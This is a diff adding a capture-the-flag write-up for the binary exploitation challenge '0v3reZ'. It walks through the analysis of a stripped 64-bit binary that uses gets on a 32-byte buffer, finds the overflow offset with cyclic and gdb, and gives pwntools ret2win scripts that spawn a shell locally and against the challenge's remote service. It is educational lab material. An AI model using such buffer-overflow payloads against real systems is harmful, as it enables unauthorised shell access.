@@ -761,7 +761,264 @@ Flag: sabr{0x7563_is_TOO_Large_for_this_Machine}
 ### Binary Exploitation Category 
 
 ### 0v3reZ:
-![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0x3reZ/1.png)
+![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/1.png)
+
+We are given a binary and a remote service to connect to lets download the binary on our machine and analyze it
+
+So at this point I did basic file check
+![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/2.png)
+![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/3.png)
+
+We see its a 64 bit binary, dynamically linked and its stripped (meaning we won’t be able to see the functions name i.e main func)
+
+We can also see that the binary has partial relro, it has no canary (so if we can a buffer overflow we won’t be stopped by stack protector), nx enabled (if we can inject shellcode to the stack we won't be able to execute it), no pie ( the address when the binary loads is static)
+
+Please forgive me for not explaining those terms well am not that good at binary exploitation yet
+
+Now lets run this binary to get an overview of what is happening
+
+```
+┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/0v3reZ]
+└─$ ./0v3reZ
+
+ ▄▄████████▄ ▄███   ▄███ ▄█████████▄ ▄█████████▄ ▄▄█████████ ▄██████████
+ ████▀▀▀████ ████   ████ ▀▀▀▀▀▀▀████ ████▀▀▀████ ████▀▀▀▀▀▀▀ ▀▀▀▀▀▀█████
+ ████   ████ ████   ████     ▄▄▄███▀ ████▄▄▄███▀ ████▄▄▄         ▄████▀▀
+ ████   ████ ████  ▄████     ▀▀▀███▄ ████▀▀▀███▄ ████▀▀▀       ▄████▀▀  
+ ████▄▄▄████ ████▄█████▀ ▄▄▄▄▄▄▄████ ████   ████ ████▄▄▄▄▄▄▄ ▄█████▄▄▄▄▄
+ ▀█████████▀ ████████▀▀  ██████████▀ ████   ████ ▀██████████ ███████████
+  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀
 
 
+b0fz: hello
+```
+
+We see it just prints out a banner then takes in our input and exits
+
+So i then de-compiled it using ghidra to analyze the functions in it
+![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/4.png)
+
+Now lets view the functions present but since its stripped we won’t exactly see the real function names.
+![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/5.png)
+
+So on checking the content of each functions I saw this in FUN_00401200 which is likely the main function.
+![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/6.png)
+
+So let me try to rename it to how its likely going to look like in the real c code
+
+```
+int main(void)
+
+{
+  char input[32]; //allocating 32 bytes of data in the buffer
+  
+  setvbuf(stdin,(char *)0x0,2,0);
+  setvbuf(stdout,(char *)0x0,2,0);
+  alarm(0x3c);
+  design(); //calling the design function
+  printf("b0fz: ");
+  gets(input); //using dangerous gets function
+  return 0;
+}
+```
+
+On checking the other functions I came across this one also FUN_004011d6 which is a function calling /bin/sh
+![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/7.png)
+
+Also let me try to rename it to how its likely going to look like in the real c code
+
+```
+void shell(void)
+
+{
+  system("/bin/sh");
+  return;
+}
+```
+
+Now from this what we can conclude is that there’s a function which call /bin/sh which would give us shell
+
+But the main function isn’t calling that function
+
+And also the main function is storing our input in a buffer which only allocates 32bytes in it and its using a vulnerable function which is `get` to receive our input.
+
+Since we can cause a buffer overflow in the binary, instead of it just exiting we can instead make it call the function that would return /bin/sh and this can be done by overwriting the RIP (Instruction Pointer Register) to call the shell function.
+
+So i used pwntools for the exploitation but first we need to get the following things:
+
+The offset: the amount of bytes needed to get in the rbp
+
+The address we would want the rip to call
+
+So for this part I used gdb .
+
+Firstly to get the offset we need to generate bytes of data and I used cyclic tool to create 100 bytes of data
+
+```                                      
+┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/0v3reZ]
+└─$ cyclic 100
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+```                                                                                                     
+
+Now I opened the binary in gdb to run it
+
+```                                   
+┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/0v3reZ]
+└─$ gdb 0v3reZ 
+GNU gdb (Debian 12.1-4) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+GEF for linux ready, type `gef' to start, `gef config' to configure
+90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.10
+Reading symbols from 0v3reZ...
+(No debugging symbols found in 0v3reZ)
+gef➤  
+```
+
+Now we run it by simply typing run/r and press enter key. 
+
+It will then require an input from us so we give it the data gotten from cyclic
+
+```
+gef➤  r
+Starting program: /home/mark/Desktop/CTF/Sabr/pwn/0v3reZ/0v3reZ 
+[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+ ▄▄████████▄ ▄███   ▄███ ▄█████████▄ ▄█████████▄ ▄▄█████████ ▄██████████
+ ████▀▀▀████ ████   ████ ▀▀▀▀▀▀▀████ ████▀▀▀████ ████▀▀▀▀▀▀▀ ▀▀▀▀▀▀█████
+ ████   ████ ████   ████     ▄▄▄███▀ ████▄▄▄███▀ ████▄▄▄         ▄████▀▀
+ ████   ████ ████  ▄████     ▀▀▀███▄ ████▀▀▀███▄ ████▀▀▀       ▄████▀▀  
+ ████▄▄▄████ ████▄█████▀ ▄▄▄▄▄▄▄████ ████   ████ ████▄▄▄▄▄▄▄ ▄█████▄▄▄▄▄
+ ▀█████████▀ ████████▀▀  ██████████▀ ████   ████ ▀██████████ ███████████
+  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀
+
+
+b0fz: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000401282 in ?? ()
+```
+
+After giving it the 100 bytes of `a` it causes a segmentation fault error, then in the new line it should return the information about the registers in it's current state
+
+```
+[ Legend: Modified register | Code | Heap | Stack | String ]
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+$rax   : 0x0               
+$rbx   : 0x007fffffffdf68  →  0x007fffffffe2cb  →  "/home/mark/Desktop/CTF/Sabr/pwn/0v3reZ/0v3reZ"
+$rcx   : 0x007ffff7f9ca80  →  0x00000000fbad208b
+$rdx   : 0x1               
+$rsp   : 0x007fffffffde58  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
+$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
+$rsi   : 0x1               
+$rdi   : 0x007ffff7f9ea20  →  0x0000000000000000
+$rip   : 0x00000000401282  →   ret 
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x007ffff7dd72a8  →  0x00100022000043f9
+$r11   : 0x246             
+$r12   : 0x0               
+$r13   : 0x007fffffffdf78  →  0x007fffffffe2f9  →  "COLORFGBG=15;0"
+$r14   : 0x00000000403e18  →  0x000000004011a0  →   endbr64 
+$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x007fffffffde58│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"      ← $rsp
+0x007fffffffde60│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
+0x007fffffffde68│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
+0x007fffffffde70│+0x0018: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
+0x007fffffffde78│+0x0020: "saaataaauaaavaaawaaaxaaayaaa"
+0x007fffffffde80│+0x0028: "uaaavaaawaaaxaaayaaa"
+0x007fffffffde88│+0x0030: "waaaxaaayaaa"
+0x007fffffffde90│+0x0038: 0x00000061616179 ("yaaa"?)
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+     0x401277                  call   0x4010d0 <gets@plt>
+     0x40127c                  mov    eax, 0x0
+     0x401281                  leave  
+ →   0x401282                  ret    
+[!] Cannot disassemble from $PC
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+[#0] Id 1, Name: "0v3reZ", stopped 0x401282 in ?? (), reason: SIGSEGV
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+[#0] 0x401282 → ret 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+Now we see that we are able to overwrite most of the registers with aabbcc*
+
+Now lets get the first four byte of the rsp register in my case its “kaaa” it should be the same for you i guess
+
+After getting that we then do `cyclic -l kaaa` and its output is 40 that means the offset is 40.
+
+```                                        
+┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/0v3reZ]
+└─$ cyclic -l kaaa
+40
+```
+
+Now that we have the offset, lets get the memory address we want to return to and obviously its the /bin/sh address since that will give us shell.
+
+Using ghidra we can see the address by checking the function FUN_004011d6
+![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/8.png)
+
+Address = 0x4011de
+
+Now I made an exploit to run the binary and exploit it here’s my script below
+
+```
+#!/usr/bin/python2
+from pwn import *
+
+#start the process either locally or remotely
+io = process('./0v3reZ')
+#io = remote('13.36.37.184',61000)
+
+#cause the buffer overflow and making an address for it to return 
+padding = "A" * 40 #amount of bytes * offset
+addr = p64(0x4011de) #this address calls /bin/sh
+payload = padding + addr 
+
+#send the payload
+io.send(payload)
+io.interactive()
+```
+
+Then on running it
+![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/9.png)
+
+So it worked now lets run this on the remote server here’s my script below
+
+```
+from pwn import *
+
+#start the process either locally or remotely
+#io = process('./0v3reZ')
+io = remote('13.36.37.184',61000)
+
+#cause the buffer overflow and making an address for it to return 
+padding = "A" * 40 #amount of bytes * offset
+addr = p64(0x4011de) #this address calls /bin/sh
+payload = padding + addr 
+
+#send the payload
+io.send(payload)
+io.interactive()
+```
+
+Flag: sabr{m3m0ry_c0rrup710n_iz_fUNNNNNNNNNNNN}
 
